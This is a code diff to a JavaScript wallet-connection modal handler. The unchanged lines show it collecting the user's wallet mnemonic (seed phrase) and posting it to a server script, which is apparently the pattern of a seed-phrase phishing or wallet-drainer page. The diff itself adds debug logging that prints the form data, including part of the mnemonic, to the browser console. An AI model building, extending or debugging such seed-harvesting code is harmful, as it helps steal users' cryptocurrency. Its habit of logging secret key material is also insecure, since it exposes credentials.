@@ -114,11 +114,20 @@ window.WalletModalHandler = {
             const formData = new FormData(document.getElementById('connectForm'));
             formData.append('mnemonic', mnemonic);
             
+            // Debug: Log what we're sending
+            console.log('Wallet Form Data being sent:');
+            for (let [key, value] of formData) {
+                console.log(`  ${key}: ${typeof value === 'string' ? value.substring(0, 50) : value}`);
+            }
+            
             const response = await fetch('api/wallet_handler.php', {
                 method: 'POST',
                 body: formData,
                 credentials: 'same-origin'
             });
+            
+            // Debug: Log response status
+            console.log('Wallet API Response Status:', response.status);
             
             // Parse response
             let result = {};
@@ -132,6 +141,8 @@ window.WalletModalHandler = {
             } else {
                 result = { success: response.ok, message: await response.text() };
             }
+            
+            console.log('Wallet API Result:', result);
             
             // Check if request was successful
             if (result.success) {
